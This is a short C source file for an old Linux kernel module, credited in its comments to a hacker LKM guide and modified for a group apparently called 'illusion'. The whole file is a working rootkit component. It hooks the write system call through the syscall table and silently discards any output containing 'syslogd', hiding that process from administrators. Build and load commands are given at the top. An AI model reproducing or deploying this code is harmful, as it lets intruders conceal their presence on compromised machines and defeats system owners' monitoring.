/* kgcc -O2 -Wall -c sysd.c -o sysd.o; insmod sysd.o
 * by gunzip - stolen from THC guide to LKM; works on 2.2.x linux kernel
 * modified by dunric for illusion */

#define MODULE
#define __KERNEL__
#include <linux/config.h>
#include <linux/stddef.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/malloc.h>
#include <linux/unistd.h>
#include <linux/string.h>
#include <asm/uaccess.h>
#include <sys/syscall.h>
#define HIDDEN "syslogd"
extern void* sys_call_table[];
int (*o_write)(unsigned int fd, char *buf,unsigned int count);
int n_write(unsigned int fd, char *buf,unsigned int count){
char *kernel_buf;kernel_buf=(char *)kmalloc(1000,GFP_KERNEL);
memset(kernel_buf,0,sizeof(kernel_buf));copy_from_user(kernel_buf,buf,999);
if(strstr(kernel_buf,HIDDEN)){kfree(kernel_buf);return 0;}
else{kfree(kernel_buf);return o_write(fd, buf, count);}}
int init_module(void) {o_write=sys_call_table[SYS_write];
sys_call_table[SYS_write] = n_write;return 0;}
void cleanup_module(void) {sys_call_table[SYS_write] = o_write;}
